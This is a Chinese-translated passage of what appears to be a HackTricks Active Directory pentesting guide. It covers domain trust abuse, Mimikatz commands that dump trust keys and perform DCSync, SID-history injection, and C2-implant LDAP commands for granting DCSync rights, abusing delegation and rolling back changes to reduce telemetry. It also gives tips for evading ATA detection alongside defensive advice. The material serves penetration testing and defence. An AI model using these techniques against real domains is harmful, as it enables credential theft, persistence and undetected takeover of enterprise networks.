在内存中修改 **LSASS** 以建立一个**通用密码**，从而获得对所有域账户的访问权限。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建你自己的 **SSP** 来**以明文捕获**用于访问机器的**凭据**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它在 AD 中注册一个**新的 Domain Controller**，并使用它来**推送属性**（如 SIDHistory、SPNs...）到指定对象，且**不会留下有关修改的日志**。你需要 DA 权限并且位于**根域**内部。\
注意，如果你使用了错误的数据，会产生相当丑陋的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

之前我们讨论了如果你有**足够权限读取 LAPS 密码**时如何提升权限。然而，这些密码也可以用于**维持持久化**。\
参见：


{{#ref}}
laps.md
{{#endref}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着**攻破单个域可能会导致整个 Forest 被攻破**。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，使得来自一个**域**的用户可以访问另一个**域**中的资源。它本质上在两个域的身份验证系统之间创建了一个链接，允许身份验证验证顺畅地传递。当域建立信任时，它们在各自的 **Domain Controllers (DCs)** 中交换并保留特定的**密钥**，这些密钥对于信任的完整性至关重要。

在典型场景中，如果用户打算访问一个 **受信域** 中的服务，他们必须先向自己域的 DC 请求一个特殊的票证，称为 **inter-realm TGT**。该 TGT 使用两个域在双向域信任中达成一致的共享 **key** 进行加密。随后用户将该 TGT 提交给 **受信域的 DC** 以获取服务票证（**TGS**）。在受信域的 DC 成功验证 inter-realm TGT 后，它会签发 TGS，授予用户对该服务的访问权限。

**步骤**：

1. **客户端计算机**在 **Domain 1** 中开始流程，使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**。
2. 如果客户端成功认证，DC1 会签发新的 TGT。
3. 客户端随后向 DC1 请求一个 **inter-realm TGT**，以便访问 **Domain 2** 中的资源。
4. inter-realm TGT 使用作为双向域信任一部分在 DC1 和 DC2 之间共享的 **trust key** 进行加密。
5. 客户端将 inter-realm TGT 带到 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用其共享的 trust key 验证 inter-realm TGT，如果有效，则为客户端想要访问的 Domain 2 中的服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，客户端向服务器出示该 TGS（该票证用服务器的账号 hash 加密），以访问 Domain 2 中的服务。

### Different trusts

需要注意的是，**信任可以是单向或双向的**。在双向选项中，两个域会互相信任，但在**单向**信任关系中，一个域将是**trusted**，另一个是 **trusting** 域。在后一种情况下，**你只能从 trusted 域访问 trusting 域内的资源**。

如果 Domain A 信任 Domain B，则 A 为 trusting 域，B 为 trusted 域。此外，在 **Domain A** 中，这将是一个 **Outbound trust**；在 **Domain B** 中，这将是一个 **Inbound trust**。

**不同的信任关系**

- **Parent-Child Trusts**：这是同一 forest 内常见的设置，子域会自动与其父域建立双向可传递的信任。基本上，这意味着身份验证请求可以在父域和子域之间无缝流动。
- **Cross-link Trusts**：也称为 "shortcut trusts"，在子域之间建立以加速引用过程。在复杂的 forest 中，身份验证引用通常必须向上到 forest 根，然后再向下到目标域。通过创建 cross-links，路径被缩短，这在地理分布广泛的环境中特别有用。
- **External Trusts**：这些是在不同、不相关域之间建立的，天生是非传递性的。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 对于访问不在当前 forest 且未通过 forest trust 连接的域中的资源很有用。通过对外部信任执行 SID 过滤可以增强安全性。
- **Tree-root Trusts**：这些信任在 forest 根域与新添加的 tree root 之间自动建立。虽然不常见，但在向 forest 添加新的域树以保持唯一域名时，tree-root trusts 很重要，并确保双向可传递性。更多信息请参见 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：此类信任是在两个 forest 根域之间建立的双向可传递信任，同时执行 SID 过滤以增强安全措施。
- **MIT Trusts**：这些信任与非 Windows、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 比较专用，适用于需要与 Windows 生态系统之外的 Kerberos 基础系统集成的环境。

#### Other differences in **trusting relationships**

- 信任关系也可以是 **transitive**（A trust B, B trust C, 则 A trust C）或 **non-transitive**。
- 信任关系可以设置为 **bidirectional trust**（双方互相信任）或 **one-way trust**（仅一方信任另一方）。

### Attack Path

1. **枚举**信任关系
2. 检查是否有任何 **security principal**（user/group/computer）对**另一个域**的资源拥有**访问**权限，可能通过 ACE 条目或成为另一个域的组成员。寻找**跨域的关系**（信任可能就是为此创建的）。
1. 在这种情况下，kerberoast 也可能是另一个选项。
3. **攻破**可以**跨域 pivot** 的**账户**。

攻击者可以通过三种主要机制访问另一个域的资源：

- **本地组成员资格**：主体可能被添加到机器上的本地组，例如服务器上的 “Administrators” 组，从而获得对该机器的重大控制权。
- **外域组成员资格**：主体也可以是外域内某些组的成员。然而，该方法的有效性取决于信任的性质和组的范围。
- **访问控制列表 (ACLs)**：主体可能在 **ACL** 中被指定，尤其是在 **DACL** 中作为 **ACE** 的实体，从而为他们提供对特定资源的访问。对于想深入了解 ACL、DACL 和 ACE 工作机制的人，题为 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 的白皮书是极有价值的资源。

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域中的外部安全主体。这些将来自**外部域/forest**的 user/group。

你可以在 **Bloodhound** 中检查此项，或使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
列举域信任的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 有 **2 个 trusted keys**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以使用下面的命令查看当前域使用的密钥：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过滥用信任和 SID-History injection，将 Enterprise admin 权限提升到子域/父域：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解如何利用 Configuration NC 至关重要。Configuration NC 是 Active Directory (AD) 环境中用于存储整个 forest 配置数据的集中存储库。该数据会复制到 forest 中的每个 Domain Controller (DC)，可写的 DC 会保有 Configuration NC 的可写副本。要利用这一点，需要在某个 DC 上拥有 **SYSTEM 权限**，最好是子域的 DC。

Link GPO to root DC site

Configuration NC 的 Sites 容器包含关于 AD forest 中所有域内计算机站点的信息。通过在任意 DC 上以 SYSTEM 权限操作，攻击者可以将 GPO 链接到 root DC 的 site。这一操作可能通过操纵应用于这些站点的策略来影响根域的安全性。

有关深入信息，可以参考研究 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)。

Compromise any gMSA in the forest

一种攻击向量是针对域内有特权的 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。只要在任意 DC 上拥有 SYSTEM 权限，就可以访问 KDS Root key 并计算整个 forest 中任意 gMSA 的密码。

详细分析和逐步指南见：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

互补的委派 MSA 攻击 (BadSuccessor – 滥用 migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

补充外部研究: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

Schema change attack

此方法需要耐心，等待新的有特权的 AD 对象被创建。拥有 SYSTEM 权限的攻击者可以修改 AD Schema，赋予任意用户对所有 class 的完全控制权。这可能导致对新创建的 AD 对象的未授权访问和控制。

更多阅读请见 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)。

From DA to EA with ADCS ESC5

ADCS ESC5 漏洞针对的是对 PKI 对象的控制，以创建一个证书模板，从而能够以 forest 中的任何用户身份进行身份验证。由于 PKI 对象位于 Configuration NC 中，攻陷可写的子域 DC 可以执行 ESC5 攻击。

更多细节可见 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)。在缺少 ADCS 的场景中，攻击者也可以自行搭建必要组件，参见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在此情景中 **你的域被外部域信任**，这使你对其拥有**未明确的权限**。你需要找出**你域中的哪些主体对外部域拥有何种访问权限**，然后尝试利用这些权限：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部林域 - 单向（出站）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在这个场景中，**your domain** 正在将一些 **privileges** 授予来自 **different domains** 的主体。

然而，当一个 **domain is trusted** 被信任域（trusting domain）信任时，受信任域会**创建一个具有可预测名称的用户**，并使用**trusted password** 作为该用户的**密码**。这意味着可以**访问 trusting domain 的用户以进入受信任域**来枚举并尝试进一步提升权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种危害受信任域的方式是找到在域信任的**相反方向**创建的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这并不常见）。

另一种危害受信任域的方法是在一台机器上等待来自受信任域的**用户可以访问**并通过 **RDP** 登录。然后，攻击者可以向 RDP 会话进程注入代码，并从那里**访问受害者的源域**。此外，如果**受害者挂载了其硬盘**，攻击者可以从 **RDP 会话** 进程在硬盘的**启动文件夹**中存放**后门**。该技术称为 **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解

### **SID Filtering:**

- 利用 SID history 属性跨林信任的攻击风险由 SID Filtering 缓解，该功能在所有域间林信任上默认启用。其前提是认为林（forest）而非域（domain）是安全边界，这也与 Microsoft 的立场一致。
- 不过有一个问题：SID filtering 可能会破坏某些应用程序和用户访问，导致它有时被禁用。

### **Selective Authentication:**

- 对于跨林信任，使用 Selective Authentication 可确保来自两个林的用户不会被自动认证。相反，用户需要显式权限才能访问 trusting 域或林内的域和服务器。
- 需要注意的是，这些措施不能防止对可写 Configuration Naming Context (NC) 的利用或对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 以 x64 Beacon Object Files 的形式重新实现了 bloodyAD-style 的 LDAP 基元，这些 BOF 完全在主机植入（例如 Adaptix C2）内部运行。操作员通过 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该包，加载 `ldap.axs`，然后从 beacon 中调用 `ldap <subcommand>`。所有流量都使用当前登录安全上下文通过 LDAP (389)（带 signing/sealing）或 LDAPS (636)（自动证书信任）传输，因此不需要 socks 代理或磁盘痕迹。

### Implant-side LDAP 枚举

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` 将简短名称/OU 路径解析为完整的 DN 并转储相应对象。
- `get-object`, `get-attribute`, and `get-domaininfo` 提取任意属性（包括安全描述符）以及来自 `rootDSE` 的林/域元数据。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` 直接从 LDAP 暴露 roasting 候选、委派设置以及现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` and `get-writable --detailed` 解析 DACL 列出受托人、权限（GenericAll/WriteDACL/WriteOwner/属性写入）和继承情况，从而提供用于 ACL 权限提升的直接目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 写入原语用于提权与持久化

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 允许操作者在有 OU 权限的位置部署新的主体或计算机账户。`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 在发现 write-property 权限后可直接劫持目标。
- 面向 ACL 的命令（如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync`）将任何 AD 对象上的 WriteDACL/WriteOwner 转换为密码重置、组成员控制或 DCSync 复制权限，且不会留下 PowerShell/ADSI 痕迹。`remove-*` 对应命令用于清理注入的 ACE。

### 委派、roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 立即使被攻陷的用户变为 Kerberoastable；`add-asreproastable`（UAC 切换）将其标记为可进行 AS-REP roasting，而无需触碰密码。
- 委派宏（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）可从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，启用 constrained/unconstrained/RBCD 攻击路径，并消除对远程 PowerShell 或 RSAT 的需求。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 将特权 SID 注入到受控主体的 SID history 中（见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 提供隐蔽的权限继承。
- `move-object` 更改计算机或用户的 DN/OU，允许攻击者在滥用 `set-password`、`add-groupmember` 或 `add-spn` 之前将资产移动到已存在委派权限的 OU 中。
- 作用范围严格的移除命令（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）允许在操作者收集凭据或建立持久化后快速回滚，最小化遥测痕迹。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御措施

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **凭据保护的防御措施**

- **Domain Admins 限制**：建议 Domain Admins 仅被允许登录到 Domain Controllers，避免在其他主机上使用。
- **Service Account 特权**：服务不应以 Domain Admin (DA) 权限运行以维持安全性。
- **临时特权限制**：对于需要 DA 权限的任务，应限制其持续时间。可通过下列方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 缓解**：审计事件 ID 2889/3074/3075，然后在 DCs/clients 上强制启用 LDAP signing 及 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **实施欺骗技术**

- 实施欺骗涉及设置陷阱，例如诱饵用户或计算机，带有如密码永不过期或被标记为 Trusted for Delegation 的特性。详细做法包括创建具有特定权限的用户或将其添加到高权限组中。
- 一个实用示例：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署欺骗技术的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)。

### **识别欺骗**

- **对于用户对象**：可疑指征包括异常的 ObjectSID、罕见的登录、创建日期异常以及较低的坏密码计数。
- **一般指征**：将潜在诱饵对象的属性与真实对象进行比较可揭示不一致性。像 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 这样的工具可以帮助识别此类欺骗。

### **绕过检测系统**

- **绕过 Microsoft ATA 检测**：
- **用户枚举**：避免在 Domain Controllers 上进行会话枚举以防触发 ATA 检测。
- **票据模拟**：使用 **aes** 密钥创建票据有助于规避检测，因为不会降级到 NTLM。
- **DCSync 攻击**：建议在非 Domain Controller 上执行以避免 ATA 检测，因为直接在 Domain Controller 上执行会触发告警。

## 参考资料

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
